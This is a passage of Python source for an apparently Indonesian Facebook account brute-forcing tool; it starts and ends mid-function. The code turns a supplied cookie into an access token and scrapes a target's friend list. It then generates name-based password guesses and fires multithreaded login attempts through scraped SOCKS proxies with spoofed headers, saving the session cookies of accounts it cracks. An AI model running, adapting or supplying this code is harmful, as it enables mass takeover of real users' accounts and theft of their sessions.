		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
asu = random.choice([m,h,u,b])
#----------[ HAPUS ]----------#		
def ganti_cokies():
      try:os.remove(".cok.txt")
      except:pass
      try:os.remove(".token.txt")
      except:pass
      login_cokies()
      	
#----------[ BANNER ]----------#
def banner():
      if "win" in sys.platform:os.system("cls")
      else:os.system("clear")
      print(f'''╔═╦╦╦══╦══╦╦══╦══╦╦╦═╗
║╔╩╩╩══╩══╩╩══╩══╩╩╩╗║{hijo}SC ORI:SMBF{puti}
║║╔╦╦╦═╦╗╔═╦══╦══╦═╗║║{hijo}DECODE:Xshinchan{puti}
║║║║║║═╣║║╔╣╔╗║║║║═╣║║
║║║║║║═╣╚╣╚╣╚╝║║║║═╣║║
║║╚══╩═╩═╩═╩══╩╩╩╩═╝║║
║╚╦╦╦══╦══╦╦══╦══╦╦╦╝║
╚═╩╩╩══╩══╩╩══╩══╩╩╩═╝﻿ {hijo}MULTI BRUTE FORCE''')
    	
#----------[ LOGIN-COKIES ]----------#        
def login_cokies():
    try:
        banner()
        ses = requests.Session()
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        your_cookies=input(f'{kun}└──[{puti} Cookies {hijo}: ')
        with requests.Session() as r:
                r.headers.update({
                    'content-type': 'application/x-www-form-urlencoded',
                })
                data = {
                    'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
                    'scope': ''
                }
                response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
                code, user_code = response['code'], response['user_code']
                verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
                r.headers.pop(
                    'content-type'
                )
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
                    'sec-fetch-site': 'cross-site',
                    'Host': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'sec-fetch-dest': 'document',
                })
                response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
                if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
                    print(f"{kun}╭────────────────────────────────────────────{puti}")
                    print(f"{kun}└──[{mer} Cookie Invalid..", end='\r');time.sleep(3.5);exit();print("                     ", end='\r')
                else:
                    action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
                    fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
                    data = {
                        'fb_dtsg': fb_dtsg,
                        'jazoest': jazoest,
                        'qr': 0,
                        'user_code': user_code,
                    }
                    r.headers.update({
                        'origin': 'https://m.facebook.com',
                        'referer': verification_url,
                        'content-type': 'application/x-www-form-urlencoded',
                        'sec-fetch-site': 'same-origin',
                    })
                    response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
                    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                        r.headers.pop(
                            'content-type'
                        );r.headers.pop(
                            'origin'
                        )
                        response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

                        action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
                        fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
                        jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
                        scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
                        display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
                        user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
                        logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
                        auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
                        encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
                        return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
                        r.headers.update({
                            'origin': 'https://m.facebook.com',
                            'referer': response3.url,
                            'content-type': 'application/x-www-form-urlencoded',
                        })
                        data = {
                            'fb_dtsg': fb_dtsg,
                            'jazoest': jazoest,
                            'scope': scope,
                            'display': display,
                            'user_code': user_code,
                            'logger_id': logger_id,
                            'auth_type': auth_type,
                            'encrypted_post_body': encrypted_post_body,
                            'return_format[]': return_format,
                        }
                        response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
                        windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
                        r.headers.pop(
                            'content-type'
                        );r.headers.pop(
                            'origin'
                        )
                        r.headers.update({
                            'referer': 'https://m.facebook.com/',
                        })
                        response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
                        if 'Sukses!' in str(response6):
                            r.headers.update({
                                'sec-fetch-mode': 'no-cors',
                                'referer': 'https://graph.facebook.com/',
                                'Host': 'graph.facebook.com',
                                'accept': '*/*',
                                'sec-fetch-dest': 'script',
                                'sec-fetch-site': 'cross-site',
                            })
                            response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
                            access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
                            print(f"{kun}╭────────────────────────────────────────────{puti}")
                            print(f"{kun}└──[{hijo} {access_token}")
                            ken = open(".token.txt", "w").write(access_token)
                            cok = open(".cok.txt", "w").write(your_cookies)
                            print(f"{kun}╭────────────────────────────────────────────{puti}")
                            suk = input(f'{kun}└──[{puti} Tekan Enter ] ');menu()                       
                        else:
                            print(f"{kun}╭────────────────────────────────────────────{puti}")
                            exit(f'{kun}└──[{mer} Login gagal.. ')
    except Exception as e:
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        exit(f"{kun}└──[{mer} Login Gagal Cek Tumbal Lo Ngab :-(")
        time.sleep(3)
        ganti_cokies()		
  
#----------[ BAGIAN-MENU ]----------#            
def menu():
        try:
            token = open('.token.txt','r').read()
            cok = open('.cok.txt','r').read()
            tokene.append(token)
            try:
                baz_ganteng = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokene[0], cookies={'cookie':cok})
                useridz = json.loads(baz_ganteng.text)['id']
                username = json.loads(baz_ganteng.text)['name']
            except KeyError:
                print(f"{kun}╭────────────────────────────────────────────{puti}")
                print(f"{kun}└──[{mer} Akun anda terkena limit atau mode free silakan ganti cookies atau ubah ke mode data :-(")
                time.sleep(3)
                login_cokies()
        except requests.exceptions.ConnectionError:
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Koneksi Problem ")
        except IOError:
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            print(f"{kun}└──[{mer} Akun anda terkena limit atau mode free silakan ganti cookies atau ubah ke mode data :-(")
            time.sleep(3)
            login_cokies()
        except IOError:
            ganti_cokies()
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Cokies Expired ")           
        banner()            
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        print(f'{kun}└──[{puti} Username {mer}: {username} {puti}')
        print(f'{kun}└──[{puti} UserID {mer}: {useridz} {puti}')
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        print(f'{kun}└──[{puti} 01. HACK PUBLIK ')
        print(f'{kun}└──[{puti} 02. HACK FILE ')
        print(f'{kun}└──[{puti} 03. Cek hasil OK ')
        print(f'{kun}└──[{puti} 04. Cek hasil CP ')
        print(f'{kun}└──[{puti} 00. Ganti cokies ')
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        CYXIEON_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
        if CYXIEON_GANTENG in ['01','1']:
            crack_publik()
        elif CYXIEON_GANTENG in ['02','2']:
        	crack_file()
        elif CYXIEON_GANTENG in ['03','3']:
            hasil_ok()
        elif CYXIEON_GANTENG in ['04','4']:
            hasil_cp()
        elif CYXIEON_GANTENG in ['00','0']:
            ganti_cokies()
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            print(f"{kun}└──[{mer} Berhasil Hapus Cokies ")  
            time.sleep(3)      
            exit()    
        else:
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Yang bener ter :-( ")            

#----------[ CRACK-PUBLIK  ]----------#            
def crack_publik():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()		
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		a = input('└──[ masukan id target: ')
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
			print(f"{kun}╭────────────────────────────────────────────{puti}")
			print('└──[ Total Idz : {}'.format(len(id)));atur_id()
		except Exception as e:
			print(e)
	      
#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('CYXIEON-OK')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-OK/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{hijo}{cpkuni[0]}{puti}").add(f"{hijo}{cpkuni[1]}{puti}")
			tree.add(f"{hijo}{cpkuni[2]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()

#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('CYXIEON-CP')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-CP/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{kun}{cpkuni[0]}{puti}").add(f"{kun}{cpkuni[1]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()
def crack_file():
	try:vin = os.listdir('dump/')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\nAnda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('dump/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>> %s. %s ( %s idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ( %s idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'>> Pilih Yang Bener Kontol ')
			time.sleep(3)
			menu()
		try:lin = open('dump/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			menu()
		for xid in lin:
			id.append(xid)
		atur_id()																		
#----------[ MENU-IDZ ]----------#		
def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_method()
     
#----------[ MENU-METODE ]----------#
def atur_method():
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} 01. Validate ')
	print(f'{kun}└──[{puti} 02. Reguler ')
	print(f'{kun}└──[{puti} 03. Asyinc ')      
	print(f"{kun}╭────────────────────────────────────────────{puti}") 
	CYXIEON_METHODE = input(f'{kun}└──[{puti} Input method : ')
	if CYXIEON_METHODE in ['1','01']:
	   method.append('validate')  
	elif CYXIEON_METHODE in ['2','02']:
	   method.append('reguler')       
	elif CYXIEON_METHODE in ['3','03']:
	   method.append('asyinc')
	else:
		method.append('validate')
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} Tambahkan pw manual (y/t) ')
	print(f"{kun}╭────────────────────────────────────────────{puti}") 	
	passwtamb = input(f'{kun}└──[{puti} Input : ')
	if passwtamb in ['y','Y']:
		     sandine.append('ya')
		     print(f"{kun}╭────────────────────────────────────────────{puti}")
		     sandiku = input(f'{kun}└──[{puti} Input Pw : ')
		     sandimu = sandiku.split(',')
		     for sandixnxx in sandimu:
		         sandina.append(sandixnxx)		 
	else:
	    sandine.append('no')
	passwordlist()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwordlist():
	global prog,des
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} SEDANG MENGCRACK ')
	print(f"{kun}─────────────────────────────────────────────{puti}")
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pemuda_tersakiti:
			for _gabutz_ster_ in id2:
				idf,namamu_ku_simpan = _gabutz_ster_.split('|')[0],_gabutz_ster_.split('|')[1].lower()
				frestile = namamu_ku_simpan.split(" ")[0]
				pwx = []
				if len(namamu_ku_simpan)<6:
					if len(frestile)<3:
						pass
					else:
						pwx.append(frestile+'01')
						pwx.append(frestile+'02')
						pwx.append(frestile+'03')
						pwx.append(frestile+'04')
						pwx.append(frestile+'05')
						pwx.append(frestile+'06')
						pwx.append(frestile+'07')
						pwx.append(frestile+'08')
						pwx.append(frestile+'09')
						pwx.append(frestile+'87654321')
						pwx.append(frestile+'7654321')
						pwx.append(frestile+'654321')
						pwx.append(frestile+'54321')
						pwx.append(frestile+'4321')
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
				else:
					if len(frestile)<3:
						pwx.append(namamu_ku_simpan)
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'01')
						pwx.append(frestile+'02')
						pwx.append(frestile+'03')
						pwx.append(frestile+'04')
						pwx.append(frestile+'05')
						pwx.append(frestile+'06')
						pwx.append(frestile+'07')
						pwx.append(frestile+'08')
						pwx.append(frestile+'09')
						pwx.append(frestile+'87654321')
						pwx.append(frestile+'7654321')
						pwx.append(frestile+'654321')
						pwx.append(frestile+'54321')
						pwx.append(frestile+'4321')
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
				if 'ya' in sandine: 
					for sandi_kita in sandina:
						pwx.append(sandi_kita)
				else:pass
				if 'validate' in method:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
				elif 'asyinc' in method:
				    pemuda_tersakiti.submit(crackasyinc,idf,pwx,'m.alpha.facebook.com')
				else:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
				    
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} OK {hijo}: %s'%(ok))
	print(f'{kun}└──[{puti} CP {kun}: %s'%(cp))
	print(f"{kun}─────────────────────────────────────────────{puti}")
	
#----------[ METODE-VALIDATE ]----------#	
def crackvalidate(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😭","😂","😊"])
	prog.update(des,description=f"\r {emot}(VLTD)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks5://'+nip}
			ua = rc(ugen)
			ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
			ua2 = rc([" Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Versi/16.3 Seluler/15E148"])
			ua2 =rc(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/110.0.0.0 Safari/537.36"])
			ua2 =rc(["Mozilla/5.0 (Symbian/3; Series60/Nokia/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/Mobile Safari/535.1"])
			ua2 =rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Version/14.0 Mobile/15E148 Safari/604.1"])
			ua2 =rc(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"])
			ua2 =rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Version/14.0 Mobile/15E148 Safari/604.1"])
			link = ses.get("https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D1228878007175405%26redirect_uri%3Dhttps%253A%252F%252Fwww.ajidesign.net%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Dadb3174a9d95b35b079097f6fc72338f%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfc06039c-fdb6-4206-aca9-fe761849929a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dadb3174a9d95b35b079097f6fc72338f%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next": "https://m.facebook.com/v13.0/dialog/oauth?display=popup&response_type=code&client_id=1228878007175405&redirect_uri=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook&state=adb3174a9d95b35b079097f6fc72338f&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=fc06039c-fdb6-4206-aca9-fe761849929a&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
			head=(
		{
		'Host': url,
		'cache-control': 'max-age=0',
		'upgrade-insecure-requests': '1',
		'origin': f'https://'+url,
	     'content-type': 'application/x-www-form-urlencoded',
	     'x-requested-with': 'XMLHttpRequest',
		'user-agent': ua,
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'sec-fetch-site': 'same-origin',
	     'sec-fetch-mode': 'navigate',
	     'sec-fetch-user': '?1',
	     'sec-fetch-dest': 'document',
		'dpr': f'{str(rr(1,5))}',
		'viewport-width': f'{str(rr(300,999))}',
	     'sec-ch-ua': f'"Not)A;Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,116))}"',
	     'sec-ch-ua-mobile': '?1',
	     'sec-ch-ua-platform': '"Android"',
	     'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
	     'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(40,150))}"',
	     'sec-ch-prefers-color-scheme': 'dark',
	     'referer': f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D1228878007175405%26redirect_uri%3Dhttps%253A%252F%252Fwww.ajidesign.net%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Dadb3174a9d95b35b079097f6fc72338f%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfc06039c-fdb6-4206-aca9-fe761849929a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dadb3174a9d95b35b079097f6fc72338f%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
	     'accept-encoding': 'gzip, deflate, br',
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	     }
	 )
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': cuoz}, allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
